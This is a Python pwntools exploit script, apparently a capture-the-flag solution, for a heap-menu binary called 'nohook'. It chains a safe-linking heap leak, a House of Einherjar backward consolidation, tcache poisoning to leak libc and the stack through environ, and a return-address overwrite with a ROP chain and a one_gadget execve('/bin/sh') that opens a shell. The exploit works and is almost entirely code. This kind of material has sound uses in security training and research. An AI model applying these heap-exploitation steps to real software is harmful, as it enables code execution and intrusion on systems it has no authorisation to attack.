#!/usr/bin/python3
from pwn import *
import time
import os

os.chdir(b'../setup') 

# preamble
elf = context.binary = ELF("nohook")
libc = elf.libc
context.terminal = ['tilix', '-a', 'app-new-session', '-e']

# wrapper functrns
def sl(x): return r.sendline(x)
def sla(x, y): return r.sendlineafter(x, y)
def se(x): return r.send(x)
def sa(x, y): return r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def log_addr(name, address):
    s = '{}'.format(name).ljust(16, ' ')
    s += ': {:#x}'.format(address)
    log.info(s)


gs = '''
init-pwndbg
set breakpoint pending on
b *0x0000555555554ee4
continue
'''

HOST = args.HOST or '192.168.125.11'
LHOST = '127.0.0.1'
PORT = args.PORT or 6337

DELAY = 0.5  # needed for remote

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        if args.LHOST:
            return remote(LHOST, PORT)
        return remote(HOST, PORT)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def create(size):
    global index
    io.recvuntil(b'Please enter an option from the main menu: ')
    io.sendline(b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.recvuntil(b'Please enter an option from the main menu: ')
    io.sendline(b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


# view
def view(index):
    io.recvuntil(b'Please enter an option from the main menu: ')
    io.sendline(b"3")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b'Move: ')
    return io.recvline().strip()


# edit
def edit(index, name):
    io.recvuntil(b'Please enter an option from the main menu: ')
    io.sendline(b"4")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendafter(b"New Move name: ", name)


io = start()
io.timeout = 10  # needed for final shell to timeout 

# =-=-=- heap leak -=-=-=
# Create chunk_B and free into 0x40-tcache and leak heap address
# Left bit-shift by 12 because of safe-linking, and get
# start of heap
heap_leak = create(0x38)
free(heap_leak)
heap_base = uu64(view(heap_leak)) << 12
log_addr('heap base', heap_base)

# =-=-=- House of Einherjar-=-=-=

# create fake chunk and set fd and bk pointers
# to point to address of chunk. We can calculate this from
# heap leak
fake = create(0x38)
fake_addr = heap_base + 0x290 + 0x10

prev_size = 0
fake_size = 0x60
fd = fake_addr
bk = fake_addr
payload = [
    p64(prev_size) + p64(fake_size),
    p64(fd) + p64(bk),
]
edit(fake, flat(payload))

# create chunk to overflow from (b)
overflow = create(0x28)

# create chunk that will consolidate backwards with 
# fake chunk, creating overlapping chunks (c)
consolidate = create(0xf8)

# Edit overflow chunk to include fake prev_size and overflow
# consolidate chunk to clear prev_inuse bit
prev_size = 0x60
payload = p8(0) * 0x20 + p64(prev_size)
edit(overflow, payload)

# Fill 0xf8 tcachebin
tcache = []
for i in range(7):
    tcache.append(create(0xf8))

for i in range(7):
    free(tcache[i])

# trigger backwards consolidation: consolidate consolidates with
# fake chunk
free(consolidate)

# allocate one 0x158 chunk which overlaps overflow chunk
overlap = create(0x158)

# allocate and assign one 0x28-sized chunk
# to bypass https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f
pad = create(0x28)
free(pad)

# free overflow chunk to create overlapping primitive
free(overflow)

# =-=-=- tcache metadata poisoning -=-=-==-=-==-=-==-=-==-=-=

# =-=-=-libc leak =-=-==-=-=
#(might be possible via normal unsorted bin freeing)

# go for the 0x90 tcache count / binhead
target = heap_base + 0x10
overlap_fd_address = heap_base + 0x2e0
payload = [
    p64(0) + p64(0),
    p64(0) + p64(0),
    p64(0) + p64(0x31),
    p64(target ^ (overlap_fd_address >> 12))
]
edit(overlap, flat(payload))

# cash out head
junk = create(0x28)

# get ptr to tcache_per_thread_struct
tcache = create(0x28)

# allocate 0x90 chunk to leak libc leak
# and guard chunk
libc_leak = create(0x88)
guard = create (0x18)

# modify tcache 0x90 count so it's full
fake_counts = [
    p64(0x20000) + p64(0x7000000000000)
]
edit(tcache, flat(fake_counts))

# free 0x90 chunk into unsortedbin
free(libc_leak)

libc.address = uu64(view(libc_leak)) - libc.sym.main_arena - 96
log_addr('libc base', libc.address)

# =-=-=- stack leak =-=-==-=-=

# free overlapped chunk once again
free(junk)

# overwrite overflow fd with environ - 8
# because of safe-linking alignment checks
overlap_fd_address = heap_base + 0x2e0
payload = [
    p64(0) + p64(0),
    p64(0) + p64(0),
    p64(0) + p64(0x31),
    p64((libc.sym['environ'] - 24) ^ (overlap_fd_address >> 12))
]
edit(overlap, flat(payload))

# cash out head
junk2 = create(0x28)

# get ptr to environ - 8 
environ = create(0x28)

# fill up fake chunk with data for printf()
edit(environ,b'A' * 24)
stack_leak = uu64(view(environ)[24:])

# We can get the offset by using pwndbg's returnaddr command
# Even easier is to switch to main frame and then use returnaddr
ret_addr = stack_leak - 0x130
log_addr('main() ret addr', ret_addr)

#=-=-=-  hijack execution flow

free(junk2)

# overwrite overflow fd with retaddr - 8
# because of safe-linking alignment checks
overlap_fd_address = heap_base + 0x2e0
payload = [
    p64(0) + p64(0),
    p64(0) + p64(0),
    p64(0) + p64(0x31),
    p64((ret_addr - 8) ^ (overlap_fd_address >> 12))
]
edit(overlap, flat(payload))

# cash out head
junk3 = create(0x28)

# get ptr to environ - 8
ret = create(0x28)

# overwrite ret addr
rop = ROP(libc)

# one gadget constraints
# 0xd43af execve("/bin/sh", r13, r12)
# constraints:
#   [r13] == NULL || r13 == NULL
#   [r12] == NULL || r12 == NULL
payload = [
        p64(rop.find_gadget(['ret']).address),
        p64(rop.find_gadget(['pop r12', 'pop r13', 'ret']).address),
        p64(0) * 2,
        p64(libc.address + 0xd43af)
]

edit(ret, flat(payload))

# exit to trigger return
io.recvuntil(b'Please enter an option from the main menu: ')
io.sendline(b"5")
io.interactive()
